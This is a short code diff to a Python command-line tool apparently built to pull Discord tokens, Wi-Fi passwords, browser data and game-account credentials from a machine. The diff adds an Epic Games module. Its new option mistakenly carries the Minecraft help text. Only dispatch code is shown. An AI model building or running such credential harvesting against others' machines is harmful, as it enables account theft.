@@ -9,7 +9,7 @@ from modules import (
     ChromiumRecovery, WebHistoryRecovery, WebBookmarksRecovery,  # Browser
     NetworkInfoRecovery, WifiPasswordRecovery,  # Network
     SystemInfoRecovery,  # System
-    DiscordRecovery, MinecraftRecovery  # Applications
+    DiscordRecovery, MinecraftRecovery, EpicGamesRecovery  # Applications
 )
 
 
@@ -95,13 +95,16 @@ def recover_system(ctx: click.Context) -> None:
 @cli.command(name="apps", help="Recover application data")
 @click.option("--discord", "-d", is_flag=True, help="Recover Discord tokens")
 @click.option("--minecraft", "-mc", is_flag=True, help="Recover Minecraft accounts")
+@click.option("--epicgames", "-eg", is_flag=True, help="Recover Minecraft accounts")
 @click.pass_context
-def recover_discord(ctx: click.Context, discord: bool, minecraft: bool) -> None:
+def recover_discord(ctx: click.Context, discord: bool, minecraft: bool, epicgames: bool) -> None:
     """Recover application-related data"""
     if discord:
         DiscordRecovery().run()
     elif minecraft:
         MinecraftRecovery().run()
+    elif epicgames:
+        EpicGamesRecovery().run()
     else:
         click.echo("No application recovery options specified. Use --help for more info.")
         sys.exit()
